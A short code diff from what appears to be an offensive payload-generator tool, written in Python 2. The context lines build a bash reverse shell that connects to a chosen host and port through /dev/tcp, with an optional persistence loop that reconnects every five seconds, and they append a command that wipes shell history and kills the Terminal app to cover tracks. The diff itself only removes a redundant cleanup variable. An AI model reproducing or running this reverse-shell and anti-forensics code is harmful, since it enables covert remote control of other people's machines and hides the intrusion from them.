@@ -33,11 +33,9 @@ class payload:
 			persistence = raw_input(h.info_question_raw("Make Persistent? (y/n): ")).strip(" ").lower()
 			if persistence == "y":
 				shell_command = "while true; do $("+shell+" &> /dev/tcp/"+str(server.host)+"/"+str(server.port)+" 0>&1); sleep 5; done & "
-				shell_clean = "history -wc;killall Terminal"
 				break
 			else:
 				shell_command = shell+" &> /dev/tcp/"+str(server.host)+"/"+str(server.port)+" 0>&1;"
-				shell_clean = "history -wc;killall Terminal"
 				break
 		shell_command += "history -wc;killall Terminal"
 		path = raw_input(h.info_general_raw("Output File: ")).strip(" ")
